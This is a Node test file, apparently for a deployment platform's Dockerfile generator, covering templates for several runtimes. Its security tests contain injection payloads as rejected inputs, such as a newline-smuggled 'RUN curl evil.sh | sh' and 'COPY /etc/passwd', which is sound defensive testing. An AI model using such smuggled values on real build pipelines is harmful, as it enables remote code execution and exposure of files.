import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { describe, it } from 'node:test';

// Set env vars so the module loads cleanly
process.env.GITHUB_APP_ID = '12345';
process.env.GITHUB_APP_NAME = 'test-app';

const { generateDockerfile } =
  await import('../../apps/worker/src/deployment/dockerfile-generator.js');

describe('generateDockerfile — template version', () => {
  const config = {
    runtimeType: 'NODEJS',
    buildCommand: null,
    startCommand: 'node index.js',
    outputDirectory: null,
    applicationPort: 3000,
  };

  it('preserves the exact legacy output when the version is omitted or explicit', () => {
    assert.equal(
      generateDockerfile(config),
      generateDockerfile({ ...config, templateVersion: 'legacy' }),
    );
  });

  it('accepts optimized-v1 as an operator-controlled template version', () => {
    const df = generateDockerfile({ ...config, templateVersion: 'optimized-v1' });
    assert.match(df, /FROM node:22-alpine AS deps/);
    assert.ok(df.indexOf('RUN npm ci') < df.indexOf('COPY --chown=node:node . .'));
  });

  it('rejects an unknown template version', () => {
    assert.throws(
      () => generateDockerfile({ ...config, templateVersion: 'experimental' }),
      /unsupported image template version/i,
    );
  });
});

// Fixtures were generated from the generator at ea99993, before template
// versions existed. Legacy output must stay byte-identical so existing projects
// rebuild exactly as before.
describe('generateDockerfile — legacy golden output', () => {
  const goldenConfigs = {
    static: { runtimeType: 'STATIC' },
    react: {
      runtimeType: 'REACT',
      buildCommand: 'npm run build',
      outputDirectory: 'build',
      buildArgNames: ['REACT_APP_API_URL'],
    },
    vue: { runtimeType: 'VUE', buildCommand: 'npm run build', outputDirectory: 'dist' },
    nextjs: {
      runtimeType: 'NEXTJS',
      buildCommand: 'npm run build',
      outputDirectory: '.next',
      buildArgNames: ['NEXT_PUBLIC_SITE_URL'],
    },
    express: {
      runtimeType: 'EXPRESS',
      startCommand: 'npm run migrate && node server.js',
      applicationPort: 4000,
    },
    nodejs: { runtimeType: 'NODEJS' },
  };

  for (const [name, config] of Object.entries(goldenConfigs)) {
    it(`matches the pre-versioning ${name} Dockerfile`, async () => {
      const expected = await readFile(
        new URL(`./fixtures/legacy-dockerfiles/${name}.Dockerfile`, import.meta.url),
        'utf8',
      );
      assert.equal(generateDockerfile({ templateVersion: 'legacy', ...config }), expected);
    });
  }
});

describe('generateDockerfile — STATIC', () => {
  it('uses nginx and copies . to html dir', () => {
    const df = generateDockerfile({
      runtimeType: 'STATIC',
      buildCommand: null,
      startCommand: null,
      outputDirectory: null,
      applicationPort: null,
    });
    assert.ok(df.includes('FROM nginx'));
    assert.ok(df.includes('COPY . /usr/share/nginx/html'));
    assert.ok(!df.includes('npm'));
  });
});

describe('generateDockerfile — REACT', () => {
  it('uses multi-stage build with nginx output', () => {
    const df = generateDockerfile({
      runtimeType: 'REACT',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: 'dist',
      applicationPort: null,
    });
    assert.ok(df.includes('AS builder'));
    assert.ok(df.includes('FROM nginx'));
    assert.ok(df.includes('npm run build'));
    assert.ok(df.includes('/app/dist /usr/share/nginx/html'));
  });
  it('resolves a build command that calls a locally installed binary', () => {
    const df = generateDockerfile({
      runtimeType: 'REACT',
      buildCommand: 'vite build',
      startCommand: null,
      outputDirectory: 'dist',
      applicationPort: null,
    });
    assert.match(df, /ENV PATH=\/app\/node_modules\/\.bin:\$PATH\nRUN vite build/);
  });
  it('defaults outputDirectory to dist when null', () => {
    const df = generateDockerfile({
      runtimeType: 'REACT',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: null,
      applicationPort: null,
    });
    assert.ok(df.includes('/app/dist'));
  });
});

describe('generateDockerfile — VUE', () => {
  it('uses multi-stage build identical to REACT', () => {
    const df = generateDockerfile({
      runtimeType: 'VUE',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: 'dist',
      applicationPort: null,
    });
    assert.ok(df.includes('AS builder'));
    assert.ok(df.includes('nginx'));
  });
});

describe('generateDockerfile — NEXTJS', () => {
  it('uses three-stage build with standalone output', () => {
    const df = generateDockerfile({
      runtimeType: 'NEXTJS',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: '.next',
      applicationPort: null,
    });
    assert.ok(df.includes('AS deps'));
    assert.ok(df.includes('AS builder'));
    assert.ok(df.includes('standalone'));
    assert.ok(df.includes('EXPOSE 3000'));
  });
  it('resolves a build command that calls a locally installed binary', () => {
    const df = generateDockerfile({
      runtimeType: 'NEXTJS',
      buildCommand: 'next build',
      startCommand: null,
      outputDirectory: '.next',
      applicationPort: null,
    });
    assert.match(df, /ENV PATH=\/app\/node_modules\/\.bin:\$PATH\nRUN next build/);
  });
  it('exposes a declared build argument to the build command', () => {
    const df = generateDockerfile({
      runtimeType: 'NEXTJS',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: '.next',
      applicationPort: null,
      buildArgNames: ['NEXT_PUBLIC_SUPABASE_URL'],
    });
    assert.match(
      df,
      /ARG NEXT_PUBLIC_SUPABASE_URL\nENV NEXT_PUBLIC_SUPABASE_URL=\$NEXT_PUBLIC_SUPABASE_URL/,
    );
  });
  it('declares build arguments in the stage that runs the build', () => {
    const df = generateDockerfile({
      runtimeType: 'NEXTJS',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: '.next',
      applicationPort: null,
      buildArgNames: ['NEXT_PUBLIC_A'],
    });
    const builderStage = df.slice(df.indexOf('AS builder'));
    assert.ok(
      builderStage.indexOf('ARG NEXT_PUBLIC_A') < builderStage.indexOf('RUN npm run build'),
    );
  });
  it('emits no ARG line when the project has no public environment', () => {
    const df = generateDockerfile({
      runtimeType: 'NEXTJS',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: '.next',
      applicationPort: null,
    });
    assert.ok(!df.includes('ARG '));
  });
  it('refuses a build argument name that could inject a directive', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'NEXTJS',
          buildCommand: 'npm run build',
          startCommand: null,
          outputDirectory: '.next',
          applicationPort: null,
          buildArgNames: ['NEXT_PUBLIC_A\nRUN echo pwned'],
        }),
      /Invalid build argument name/,
    );
  });

  it('creates an empty public directory in optimized-v1 when the repository omits it', () => {
    const df = generateDockerfile({
      runtimeType: 'NEXTJS',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: '.next',
      applicationPort: null,
      templateVersion: 'optimized-v1',
    });
    assert.match(df, /RUN npm run build\nRUN mkdir -p \/app\/public/);
  });
});

describe('generateDockerfile — versioned Next.js strategies', () => {
  const base = {
    runtimeType: 'NEXTJS',
    buildCommand: 'npm run build',
    applicationPort: 3000,
  };

  it('uses Debian Node 22, prunes dependencies, and starts standard mode with npm', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'next_standard_v1' });
    assert.match(dockerfile, /^FROM node:22-bookworm-slim AS builder/m);
    assert.match(dockerfile, /RUN npm prune --omit=dev/);
    assert.match(dockerfile, /CMD \["npm", "start"\]/);
  });

  it('copies the standalone server, static assets, and optional public directory', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'next_standalone_v1' });
    assert.match(dockerfile, /RUN mkdir -p \/app\/public/);
    assert.match(dockerfile, /\/app\/\.next\/standalone/);
    assert.match(dockerfile, /\/app\/\.next\/static/);
    assert.match(dockerfile, /CMD \["node", "server\.js"\]/);
  });

  it('serves export output with the unprivileged static image', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'next_export_v1' });
    assert.match(dockerfile, /FROM nginxinc\/nginx-unprivileged:1\.27-alpine/);
    assert.match(dockerfile, /COPY --from=builder \/app\/out \/usr\/share\/nginx\/html/);
    assert.match(dockerfile, /EXPOSE 8080/);
  });

  // Docker sets HOSTNAME to the container id, and Next servers bind to it,
  // leaving them listening on one interface instead of all of them.
  it('binds the standalone server to every container interface', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'next_standalone_v1' });
    assert.match(dockerfile, /ENV HOSTNAME=0\.0\.0\.0\nCMD \["node", "server\.js"\]/);
  });

  it('binds the standard server to every container interface', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'next_standard_v1' });
    assert.match(dockerfile, /ENV HOSTNAME=0\.0\.0\.0\nCMD \["npm", "start"\]/);
  });

  it('disables Next.js telemetry in every versioned build stage', () => {
    const builds = ['next_standard_v1', 'next_standalone_v1', 'next_export_v1'].map(
      (buildStrategy) => generateDockerfile({ ...base, buildStrategy }),
    );
    assert.deepEqual(
      builds.map((dockerfile) =>
        /ENV NEXT_TELEMETRY_DISABLED=1\n.*RUN npm run build/s.test(dockerfile),
      ),
      [true, true, true],
    );
  });

  it('leaves the legacy Next.js template without the versioned defaults', () => {
    const dockerfile = generateDockerfile({
      ...base,
      startCommand: null,
      outputDirectory: '.next',
    });
    assert.doesNotMatch(dockerfile, /HOSTNAME|NEXT_TELEMETRY_DISABLED/);
  });
});

describe('generateDockerfile — versioned Python strategies', () => {
  const base = {
    runtimeType: 'PYTHON',
    buildCommand: null,
    applicationPort: 8000,
    applicationModule: 'mysite.wsgi:application',
    pythonVersion: '3.12',
  };

  it('builds on the requested slim Debian Python image', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'python_django_v1' });
    assert.match(dockerfile, /^FROM python:3\.12-slim-bookworm AS builder/m);
  });

  it('installs requirements into a virtual environment copied to the runtime stage', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'python_flask_v1' });
    assert.match(
      dockerfile,
      /RUN pip install -r requirements\.txt[\s\S]*COPY --from=builder \/opt\/venv \/opt\/venv/,
    );
  });

  it('runs as an unprivileged user', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'python_flask_v1' });
    assert.match(dockerfile, /USER 10001\n/);
  });

  it('serves WSGI apps with gunicorn on every interface', () => {
    const dockerfile = generateDockerfile({ ...base, buildStrategy: 'python_django_v1' });
    assert.match(
      dockerfile,
      /CMD \["gunicorn","--bind","0\.0\.0\.0:8000",.*"mysite\.wsgi:application"\]/,
    );
  });

  it('serves ASGI apps with uvicorn on every interface', () => {
    const dockerfile = generateDockerfile({
      ...base,
      applicationModule: 'app.main:api',
      buildStrategy: 'python_fastapi_v1',
    });
    assert.match(
      dockerfile,
      /CMD \["uvicorn","app\.main:api","--host","0\.0\.0\.0","--port","8000"/,
    );
  });

  it('runs the owner build command after installing dependencies', () => {
    const dockerfile = generateDockerfile({
      ...base,
      buildCommand: 'python manage.py collectstatic --noinput',
      buildStrategy: 'python_django_v1',
    });
    assert.match(
      dockerfile,
      /RUN pip install -r requirements\.txt\n(?:.*\n)*RUN python manage\.py collectstatic --noinput\n/,
    );
  });

  it('rejects an application module that is not module:attribute', () => {
    assert.throws(
      () =>
        generateDockerfile({
          ...base,
          applicationModule: 'main:app --reload',
          buildStrategy: 'python_fastapi_v1',
        }),
      /module:attribute/,
    );
  });

  it('rejects an unapproved Python version', () => {
    assert.throws(
      () => generateDockerfile({ ...base, pythonVersion: '3.9', buildStrategy: 'python_flask_v1' }),
      /Unsupported Python version/,
    );
  });

  it('rejects a Python strategy on another runtime', () => {
    assert.throws(
      () =>
        generateDockerfile({ ...base, runtimeType: 'EXPRESS', buildStrategy: 'python_flask_v1' }),
      /PYTHON runtime/,
    );
  });
});

describe('generateDockerfile — versioned PHP strategies', () => {
  const base = {
    runtimeType: 'PHP',
    buildCommand: null,
    outputDirectory: '.',
    phpVersion: '8.4',
  };
  const plain = (overrides = {}) =>
    generateDockerfile({ ...base, buildStrategy: 'php_plain_v1', ...overrides });
  const laravel = (overrides = {}) =>
    generateDockerfile({
      ...base,
      outputDirectory: 'public',
      buildStrategy: 'php_laravel_v1',
      ...overrides,
    });

  it('runs the requested official Apache PHP image', () => {
    assert.match(plain(), /^FROM php:8\.4-apache-bookworm$/m);
  });

  it('installs composer packages only from a committed lockfile', () => {
    assert.match(plain(), /composer\.lock is required[\s\S]*composer install --no-dev/);
  });

  it('listens on the unprivileged port as www-data', () => {
    assert.match(plain(), /Listen 8080[\s\S]*USER www-data\nEXPOSE 8080/);
  });

  it('caps Apache workers below the container process limit', () => {
    assert.match(plain(), /MaxRequestWorkers 8/);
  });

  it('serves the repository root for a plain site', () => {
    assert.match(plain(), /DocumentRoot \/var\/www\/html'/);
  });

  it('serves the public folder for Laravel', () => {
    assert.match(laravel(), /DocumentRoot \/var\/www\/html\/public'/);
  });

  it('hides dotfiles, composer metadata, and vendor from the web', () => {
    assert.match(plain(), /FilesMatch "\^\\\.".*composer\\\.\(json\|lock\).*RedirectMatch 404/s);
  });

  it('makes only Laravel storage and cache writable', () => {
    assert.match(
      laravel(),
      /chown -R www-data:www-data storage bootstrap\/cache\nENV LOG_CHANNEL=stderr/,
    );
  });

  it('builds Laravel assets in a Node stage and copies only the output', () => {
    const dockerfile = laravel({ buildCommand: 'npm run build' });
    assert.match(
      dockerfile,
      /FROM node:22-bookworm-slim AS assets[\s\S]*RUN npm run build[\s\S]*COPY --from=assets \/app\/public\/build \.\/public\/build/,
    );
  });

  it('skips the asset stage without a build command', () => {
    assert.doesNotMatch(laravel(), /AS assets/);
  });

  it('rejects an unapproved PHP version', () => {
    assert.throws(() => plain({ phpVersion: '7.4' }), /Unsupported PHP version/);
  });

  it('rejects a document root outside the two layouts', () => {
    assert.throws(() => plain({ outputDirectory: '../etc' }), /document root/);
  });

  it('rejects a Laravel image that does not serve public', () => {
    assert.throws(() => laravel({ outputDirectory: '.' }), /Laravel serves its public folder/);
  });
});

describe('generateDockerfile — versioned Java strategies', () => {
  const maven = (overrides = {}) =>
    generateDockerfile({
      runtimeType: 'JAVA',
      buildStrategy: 'java_maven_v1',
      javaVersion: '21',
      ...overrides,
    });
  const gradle = () => maven({ buildStrategy: 'java_gradle_v1', javaVersion: '17' });

  it('builds with the matching Temurin JDK and runs on its JRE', () => {
    assert.match(
      maven(),
      /^FROM eclipse-temurin:21-jdk AS builder[\s\S]*^FROM eclipse-temurin:21-jre$/m,
    );
  });

  it('builds Maven projects with their wrapper and skips tests', () => {
    assert.match(maven(), /RUN sh \.\/mvnw -B -ntp -DskipTests clean package/);
  });

  it('builds Gradle projects with their wrapper and skips tests', () => {
    assert.match(gradle(), /RUN sh \.\/gradlew --no-daemon clean bootJar -x test/);
  });

  it('requires exactly one Spring Boot executable jar from the build output', () => {
    assert.match(
      maven(),
      /find target -maxdepth 1[\s\S]*Expected one executable jar[\s\S]*BOOT-INF/,
    );
  });

  it('looks for the Gradle jar in build/libs', () => {
    assert.match(gradle(), /find build\/libs -maxdepth 1/);
  });

  it('runs the jar as an unprivileged user on the fixed port', () => {
    assert.match(
      maven(),
      /USER 10001\n[\s\S]*SERVER_PORT=8080[\s\S]*CMD \["java","-jar","\/app\/application\.jar"\]/,
    );
  });

  it('caps the heap below the container memory limit', () => {
    assert.match(maven(), /-XX:MaxRAMPercentage=60/);
  });

  it('rejects an unapproved Java version', () => {
    assert.throws(() => maven({ javaVersion: '11' }), /Unsupported Java version/);
  });

  it('rejects a Java strategy on another runtime', () => {
    assert.throws(() => maven({ runtimeType: 'NODEJS' }), /JAVA runtime/);
  });
});

describe('generateDockerfile — EXPRESS', () => {
  it('uses node:22-alpine base with port exposure', () => {
    const df = generateDockerfile({
      runtimeType: 'EXPRESS',
      buildCommand: null,
      startCommand: 'node server.js',
      outputDirectory: null,
      applicationPort: 3000,
    });
    assert.ok(df.includes('FROM node:22-alpine'));
    assert.ok(df.includes('EXPOSE 3000'));
    assert.ok(df.includes('npm ci'));
    assert.ok(df.includes('CMD ["sh","-c","node server.js"]'));
  });
  it('generates valid CMD array for npm start', () => {
    const df = generateDockerfile({
      runtimeType: 'EXPRESS',
      buildCommand: null,
      startCommand: 'npm start',
      outputDirectory: null,
      applicationPort: 8080,
    });
    assert.ok(df.includes('CMD ["sh","-c","npm start"]'));
    assert.ok(df.includes('EXPOSE 8080'));
  });

  it('copies source before npm lifecycle scripts and preserves compound start commands', () => {
    const df = generateDockerfile({
      runtimeType: 'EXPRESS',
      buildCommand: null,
      startCommand: 'npm run check-node && node server.js',
      outputDirectory: null,
      applicationPort: 3000,
    });
    assert.ok(df.indexOf('COPY --chown=node:node . .') < df.indexOf('RUN npm ci'));
    assert.ok(df.includes('CMD ["sh","-c","npm run check-node && node server.js"]'));
  });
});

describe('generateDockerfile — NODEJS', () => {
  it('same as EXPRESS', () => {
    const df = generateDockerfile({
      runtimeType: 'NODEJS',
      buildCommand: null,
      startCommand: 'node index.js',
      outputDirectory: null,
      applicationPort: 3000,
    });
    assert.ok(df.includes('CMD ["sh","-c","node index.js"]'));
  });
});

describe('generateDockerfile — Node build command', () => {
  const builtNode = (overrides = {}) =>
    generateDockerfile({
      runtimeType: 'NODEJS',
      buildCommand: 'npm run build',
      startCommand: 'node apps/api/dist/server.js',
      outputDirectory: null,
      applicationPort: 3000,
      ...overrides,
    });

  it('runs the build after installing dev dependencies', () => {
    assert.match(builtNode(), /RUN npm ci --prefer-offline\n[^]*RUN npm run build\n/);
  });

  it('drops dev dependencies after the build', () => {
    assert.match(builtNode(), /RUN npm run build\nRUN npm prune --omit=dev\n/);
  });

  it('ships the built app to a runtime stage owned by the node user', () => {
    assert.match(builtNode(), /COPY --from=builder --chown=node:node \/app \.\/\nUSER node\n/);
  });

  it('resolves a build command that calls a locally installed binary', () => {
    assert.match(
      builtNode({ buildCommand: 'tsc -p apps/api' }),
      /ENV PATH=\/app\/node_modules\/\.bin:\$PATH\nRUN tsc -p apps\/api/,
    );
  });

  it('runs the build for EXPRESS projects too', () => {
    assert.ok(builtNode({ runtimeType: 'EXPRESS' }).includes('RUN npm run build'));
  });

  it('runs the build under the optimized template as well', () => {
    assert.ok(builtNode({ templateVersion: 'optimized-v1' }).includes('RUN npm run build'));
  });

  it('rejects a build command that would inject a directive', () => {
    assert.throws(() => builtNode({ buildCommand: 'npm run build\nUSER root' }), /Build command/);
  });
});

describe('generateDockerfile — UNKNOWN', () => {
  it('throws for unsupported runtime', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'UNKNOWN',
          buildCommand: null,
          startCommand: null,
          outputDirectory: null,
          applicationPort: null,
        }),
      /unsupported runtime/i,
    );
  });
});

describe('generateDockerfile — security', () => {
  it('never includes sudo or privileged directives', () => {
    for (const runtimeType of ['STATIC', 'REACT', 'EXPRESS', 'NEXTJS']) {
      const cfg = {
        runtimeType,
        buildCommand: 'npm run build',
        startCommand: 'node server.js',
        outputDirectory: 'dist',
        applicationPort: 3000,
      };
      const df = generateDockerfile(cfg);
      assert.ok(!df.includes('--privileged'), `${runtimeType} Dockerfile must not be privileged`);
      assert.ok(!df.includes('sudo'), `${runtimeType} Dockerfile must not use sudo`);
    }
  });

  it('does not expose Docker socket', () => {
    for (const runtimeType of ['STATIC', 'REACT', 'EXPRESS']) {
      const cfg = {
        runtimeType,
        buildCommand: null,
        startCommand: 'node app.js',
        outputDirectory: 'dist',
        applicationPort: 3000,
      };
      const df = generateDockerfile(cfg);
      assert.ok(
        !df.includes('/var/run/docker.sock'),
        `${runtimeType} must not mount Docker socket`,
      );
    }
  });

  // Independent re-check ahead of the web form validator (project.validator.js):
  // a newline in buildCommand/startCommand/outputDirectory would inject
  // arbitrary Dockerfile directives via RUN/CMD/COPY interpolation.
  it('rejects a buildCommand containing a newline', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'REACT',
          buildCommand: 'npm run build\nUSER root',
          startCommand: null,
          outputDirectory: 'dist',
          applicationPort: null,
        }),
      /control character/,
    );
  });

  it('rejects a startCommand containing a newline', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'NODEJS',
          buildCommand: null,
          startCommand: 'node server.js\nRUN curl evil.sh | sh',
          outputDirectory: null,
          applicationPort: 3000,
        }),
      /control character/,
    );
  });

  it('rejects an outputDirectory containing a newline', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'REACT',
          buildCommand: 'npm run build',
          startCommand: null,
          outputDirectory: 'dist\nCOPY /etc/passwd /app/passwd',
          applicationPort: null,
        }),
      /control character/,
    );
  });
});

describe('generateDockerfile — non-root runtime user', () => {
  const baseCfg = {
    buildCommand: 'npm run build',
    startCommand: 'node server.js',
    outputDirectory: 'dist',
    applicationPort: 3000,
  };

  it('static runtimes use the unprivileged nginx image on port 8080, never 80', () => {
    for (const runtimeType of ['STATIC', 'REACT', 'VUE']) {
      const df = generateDockerfile({ ...baseCfg, runtimeType });
      assert.ok(
        df.includes('FROM nginxinc/nginx-unprivileged'),
        `${runtimeType} must use the unprivileged nginx image`,
      );
      assert.ok(df.includes('EXPOSE 8080'), `${runtimeType} must expose 8080`);
      assert.ok(!/EXPOSE 80\b(?!\d)/.test(df), `${runtimeType} must not expose port 80`);
    }
  });

  it('node runtimes drop to the node user before CMD', () => {
    for (const runtimeType of ['EXPRESS', 'NODEJS', 'NEXTJS']) {
      const df = generateDockerfile({ ...baseCfg, runtimeType });
      const userIndex = df.indexOf('USER node');
      const cmdIndex = df.indexOf('CMD ');
      assert.ok(userIndex !== -1, `${runtimeType} must set USER node`);
      assert.ok(userIndex < cmdIndex, `${runtimeType} must set USER node before CMD`);
    }
  });

  it('node runtimes copy app files owned by the node user', () => {
    for (const runtimeType of ['EXPRESS', 'NODEJS', 'NEXTJS']) {
      const df = generateDockerfile({ ...baseCfg, runtimeType });
      assert.ok(
        df.includes('--chown=node:node'),
        `${runtimeType} must chown app files to node so runtime writes work`,
      );
    }
  });
});
